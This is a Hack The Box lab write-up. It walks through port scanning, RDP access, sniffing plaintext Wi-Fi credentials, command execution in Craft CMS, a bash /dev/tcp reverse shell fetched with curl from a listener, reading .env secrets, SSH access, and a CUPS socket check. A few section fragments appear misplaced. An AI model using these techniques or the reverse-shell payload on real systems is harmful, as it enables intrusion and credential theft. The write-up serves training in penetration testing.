## 1. Network Reconnaissance

I started by checking connectivity and mapping the target's exposed services. The goal was to identify viable entry points before attempting authentication.

### Connectivity Check

```bash
ping -c 3 <TARGET_IP>
```

**Result:** All three packets returned successfully, with 0% packet loss and an average latency of 8.34 ms.

### Full TCP Scan

```bash
nmap -p- --open -Pn -T4 <TARGET_IP>
```

```text
PORT     STATE SERVICE
22/tcp   open  ssh
3389/tcp open  ms-wbt-server
```

The scan identified two open TCP ports. SSH was an obvious starting point, but RDP offered another route worth investigating.

### SSH Authentication

I tested the supplied account against SSH:

```bash
ssh contractor@<TARGET_IP>
```

After repeated authentication failures, I ran a second test to rule out password-entry issues:

```bash
sshpass -p '<REDACTED>' ssh -o PubkeyAuthentication=no contractor@<TARGET_IP>
```

```text
Permission denied (publickey,password).
```

Both attempts failed. Since the host was reachable and SSH was accepting connections, this pointed to an authentication issue rather than a network connectivity problem.

### Outcome

## 2. Initial Access & Linux Enumeration

After SSH authentication failed, I switched to RDP, the other service identified during reconnaissance. This provided access to a Linux workstation and allowed me to investigate the local account, its privileges, and the surrounding environment.

### RDP Access

```bash
xfreerdp /v:<TARGET_IP> /u:contractor /p:'<REDACTED>' /cert:ignore +clipboard
```

**Result:** Successfully authenticated as `contractor` on `airside-ws01`.

### Account & Privilege Enumeration

Once connected, I checked the account identity and its effective permissions.

```bash
whoami
id
sudo -l
sudo id
```

**Key output:**

```text
contractor

User contractor may run the following commands on airside-ws01:
    (ALL : ALL) ALL

uid=0(root) gid=0(root) groups=0(root)
```

The account had unrestricted sudo privileges. Although this gave me administrative control over the workstation, it did not establish access to the internal application server.

### Filesystem Investigation

I checked the main user and administrator directories for relevant files and configuration details.

```bash
sudo ls -la /root
ls -la /home/contractor
ls -la /home/contractor/Desktop
```

The contractor's Desktop was empty, and the directory checks did not identify the expected assessment artefacts.

I also encountered permission errors when recursively searching the RDP-mounted `thinclient_drives` directory. Rather than changing its permissions, I narrowed the search to specific directories.

### Outcome

The workstation appeared to serve as an entry point into the wider environment, rather than the system hosting the intended assessment objectives. I therefore shifted my focus from local filesystem enumeration to network interfaces and internal connectivity.

**Tools & skills:** `FreeRDP` · `Linux CLI` · `Privilege Enumeration` · `Access Control` · `Filesystem Investigation` · `Troubleshooting`

---## 3. Wireless Network Investigation

With the workstation providing access to the wider environment, I turned to its network configuration. The presence of multiple wireless interfaces made it worth investigating whether additional network segments were accessible.

### Network Interface Discovery

```bash
ip -br addr
sudo iw dev wlan2 scan | grep -E 'SSID:|freq:|signal:'
```

The interface listing revealed two wireless adapters, `wlan2` and `wlan3`. Wireless scanning identified an internal network operating on **2.4 GHz, channel 6**.

### Wireless Connectivity

I connected through `wlan2` and checked the assigned network configuration.

```bash
sudo nmcli device wifi connect '<REDACTED_SSID>' ifname wlan2
ip -4 addr show wlan2
ip route
```

**Key observations:**

| Parameter | Observed value |
|---|---|
| Wireless interface | `wlan2` |
| Assigned subnet | `10.13.37.0/24` |
| Default gateway on wireless network | `10.13.37.1` |
| Wireless frequency | 2437 MHz |
| Channel | 6 |

This confirmed that the workstation could communicate with a second network beyond its initial Ethernet connection.

### Monitor Mode Configuration

I used the second wireless adapter for traffic monitoring while keeping the primary connection active.

```bash
sudo ip link set wlan3 down
sudo iw dev wlan3 set type monitor
sudo ip link set wlan3 up
sudo iw dev wlan3 set channel 6
```

Monitor mode allowed the adapter to capture wireless frames rather than operating as a normal connected client.

### Packet Capture

```bash
sudo tcpdump -i wlan3 -nn -s 0 -w /tmp/layover-wifi.pcap
```

**Result:** The capture collected 1,156 packets, with no packets reported dropped.

I then examined the captured traffic for HTTP requests and authentication-related fields.

```bash
sudo tcpdump -A -nn -r /tmp/layover-wifi.pcap 'tcp port 80' \
  | grep -E 'GET |POST |Host:|username=|password='
```

### Findings

The capture contained HTTP application traffic, including an authentication request that exposed login information in plaintext.

The key issue was not simply that wireless traffic could be captured, but that **sensitive application credentials were transmitted without transport-layer encryption**.

I preserved the original packet capture as private evidence and excluded credential values from the public documentation.

### Outcome

The traffic analysis identified an authentication weakness that became relevant to the subsequent web application security assessment.

**Tools & skills:** `iw` · `nmcli` · `tcpdump` · `802.11` · `Monitor Mode` · `Packet Analysis` · `Network Security`

---
With SSH ruled out as an immediate entry point, I moved to the exposed RDP service.

**Tools & skills:** `Nmap` · `Linux CLI` · `TCP/IP` · `Service Enumeration` · `Authentication Troubleshooting`

## 4. Web Application Investigation & Vulnerability Validation

Following the wireless traffic analysis, I investigated the internal web application and its authentication mechanisms. Once authenticated, I focused on identifying potentially unsafe server-side functionality and validating whether it could lead to command execution.

### Application Enumeration

The internal application was identified as **Craft CMS 5.9.8 (Solo edition)**.

I used Python to inspect the application's HTTP response and authentication-related fields.

```bash
python3 -c "import requests; r=requests.get('http://<INTERNAL_HOST>/admin/login'); print('Status:',r.status_code); print('Cookies:',list(r.cookies.keys())); print('CSRF fields:',[x for x in r.text.splitlines() if 'csrf' in x.lower()][:5])"
```

**Result:** The login page was accessible and exposed CSRF-related configuration information.

### Authentication Assessment

The credentials identified during network traffic analysis provided access to the CMS administration interface.

This established a connection between the earlier network finding and the application's authenticated attack surface.

### Server-Side Execution Testing

I used Chrome Developer Tools to send controlled requests from the authenticated browser session.

The first test introduced a five-second delay into the server-side execution path. I then compared the response time against a baseline request.

**Baseline request:**

```javascript
(async () => {
  const start = performance.now();

  const response = await fetch('/admin/actions/element-search/search', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Accept': 'application/json',
      'X-CSRF-Token': window.Craft.csrfTokenValue
    },
    body: JSON.stringify({
      elementType: 'craft\\elements\\Category',
      siteId: 1,
      search: ''
    })
  });

  console.log('HTTP status:', response.status);
  console.log('Elapsed seconds:', ((performance.now() - start) / 1000).toFixed(2));
})();
```

**Observed results:**

| Test | HTTP status | Response time |
|---|---|---|
| Baseline request | 200 | 0.08 seconds |
| Controlled delay test | 500 | 5.28 seconds |

The approximately five-second difference was consistent with the intended delay, but timing alone was not sufficient to conclusively establish command execution.

### Outbound Callback Verification

To strengthen the evidence, I prepared a temporary HTTP listener on the internal workstation.

```bash
python3 -m http.server 8000 --bind <LISTENER_IP> --directory /tmp
```

A subsequent controlled request produced an observable callback from the application server.

**Sanitised listener output:**

```text
<APPLICATION_SERVER> - - [...] "GET /<TEST_MARKER> HTTP/1.1" 404 -
```

The `404` response was expected because the test resource did not exist. The relevant observation was that the application server initiated the connection.

Together with the timing comparison, this provided independent evidence of server-side command execution.

### Troubleshooting

One validation attempt returned a literal command-substitution expression rather than the expected username. This showed that the execution mechanism did not interpret shell syntax in the way initially expected.

I adjusted the testing approach rather than treating the unexpected output as a successful result.

### Outcome

The investigation confirmed authenticated server-side command execution in the internal web application. Subsequent testing established an interactive shell on the application server, which is documented in the next section.

**Tools & skills:** `Craft CMS` · `Python` · `HTTP` · `JavaScript` · `Chrome DevTools` · `CSRF` · `Vulnerability Validation` · `Remote Code Execution`

---## 5. Application Server Access & Post-Exploitation

After confirming server-side command execution, I moved from individual command testing to establishing a stable foothold on the application server.

### Reverse Shell Preparation

I prepared a small Bash script on the assessment workstation to establish a reverse connection.

**Payload preparation:**

```bash
printf '%s\n' '#!/bin/bash' \
'bash -i >& /dev/tcp/<LISTENER_IP>/4444 0>&1' > /tmp/rs.sh
```

**Start the listener:**

```bash
nc -lvnp 4444
```

The script was hosted through the temporary Python HTTP server established during the previous testing stage.

### Payload Transfer & Execution

Using the previously validated command-execution mechanism, I instructed the application server to retrieve the staged script.

**Sanitised transfer command:**

```bash
curl -m 10 http://<LISTENER_IP>:8000/rs.sh -o /tmp/rs.sh
```

The HTTP server recorded a successful download:

```text
<APPLICATION_SERVER> - - [...] "GET /rs.sh HTTP/1.1" 200 -
```

Following execution of the staged script, the Netcat listener received an incoming connection.

**Key output:**

```text
Connection received on <APPLICATION_SERVER>
www-data@portal:~/portal/web$
```

This confirmed interactive command access under the web application's service account.

### Application Configuration Review

With access to the application server, I inspected its configuration to understand how the web service connected to other components.

```bash
cat /var/www/portal/.env
```

The file contained several security-sensitive settings:

```dotenv
CRAFT_SECURITY_KEY=<REDACTED>
CRAFT_DB_USER=<REDACTED>
CRAFT_DB_PASSWORD=<REDACTED>
CRAFT_DB_DATABASE=<REDACTED>
```

**Finding:** The compromised service account could read application secrets, including database authentication material and the application's security key.

This demonstrated how remote code execution could expose information beyond the immediate web application.

### Troubleshooting

During database investigation, an interactive command became unresponsive inside the reverse shell.

Interrupting the process also terminated the shell connection, highlighting a limitation of the basic Netcat session: it lacked a fully interactive terminal.

I also had to distinguish between commands running on the assessment workstation and those running inside the application-server shell.

### Outcome

The web application vulnerability was successfully developed into an interactive foothold on the internal Linux server.

The application configuration provided additional insight into the environment and its authentication mechanisms, supporting the next stage of internal access investigation.

**Tools & skills:** `Bash` · `Netcat` · `Python HTTP Server` · `Linux` · `Reverse Shells` · `Post-Exploitation` · `Configuration Analysis` · `Secrets Management`

---## 6. Internal SSH Access & Credential Investigation

With access to the application server established, I investigated how its configuration and authentication mechanisms related to other system accounts.

The objective was to move beyond the web service account and establish authenticated access to the underlying Linux environment.

### Credential Investigation

The application configuration contained database credentials and an application security key. These provided useful context for investigating how sensitive information was managed.

```bash
cat /var/www/portal/.env
```

I also examined the available database tooling and attempted to investigate the application's stored configuration.

The interactive database attempt was unsuccessful, and the subsequent SSH credentials were not independently recovered from the database during this session.

### SSH Authentication

I tested an identified internal account against the Linux SSH service.

**Sanitised command:**

```bash
ssh aporter@<INTERNAL_HOST>
```

**Observed result:**

```text
aporter@portal:~$
```

The successful connection confirmed authenticated shell access as `aporter`, separate from the earlier `www-data` session.

### Access Verification

I checked access to the account's assessment artefacts.

```bash
cat ~/user.txt
```

**Result:** The User Flag was retrieved successfully and accepted by Hack The Box.

The flag value is deliberately excluded from this documentation.

### Technical Findings

| Observation | Result |
|---|---|
| Application configuration accessible | Confirmed |
| Database credentials present | Confirmed |
| Database-based credential recovery | Not completed |
| SSH authentication as `aporter` | Successful |
| Interactive Linux shell | Confirmed |
| User Flag | Retrieved and accepted |

### Outcome

This stage established authenticated access to the internal Linux system beyond the original web service account.

It also demonstrated the importance of distinguishing between identifying sensitive configuration information and independently proving how a particular credential was recovered.

**Tools & skills:** `SSH` · `Linux` · `Credential Security` · `Application Configuration` · `Authentication Testing` · `Post-Exploitation`

---## 7. Linux Privilege Escalation Assessment

With authenticated SSH access to the internal server, I shifted my attention to local privilege escalation. I focused on identifying privileged services, checking their configurations, and assessing whether they exposed additional attack surfaces.

### Service Enumeration

I began by inspecting the CUPS printing service.

```bash
systemctl status cups --no-pager
```

**Result:** `cups.service` was active and running.

### Version Identification

```bash
cups-config --version
```

**Output:**

```text
2.4.16
```

Identifying the installed version was useful for narrowing down relevant security research, although a version number alone does not establish that a vulnerability is exploitable.

### Socket Permission Analysis

I inspected the local CUPS communication socket.

```bash
ls -l /run/cups/cups.sock
```

**Relevant output:**

```text
srwxrwxrwx
```

The socket had read, write, and execute permission bits set for the owner, group, and other users.

This warranted further investigation into how CUPS authenticates local requests and protects administrative operations. Socket permissions alone do not prove that unauthorised administrative actions are possible.

### Findings

| Check | Observed result |
|---|---|
| CUPS service | Active |
| Installed version | 2.4.16 |
| Local socket | `/run/cups/cups.sock` |
| Socket permissions | `srwxrwxrwx` |
| Privilege escalation | Not demonstrated |
| Root-level access | Not obtained |

### Security Considerations

The investigation highlighted the importance of assessing privileged services after gaining access to a Linux system.

Administrative interfaces and local communication sockets deserve particular attention because weaknesses in their access controls can potentially allow a compromise to extend beyond the initial user account.

**Recommended controls:** Maintain supported software versions, review privileged-service configurations, restrict unnecessary access, and monitor changes to administrative settings.

### Outcome

The CUPS investigation identified a privileged service and a permissively configured communication socket for further security testing. No root-level compromise was demonstrated during this assessment.

**Tools & skills:** `Linux` · `systemctl` · `Service Enumeration` · `Unix Sockets` · `Permission Analysis` · `Privilege Escalation Assessment`

---
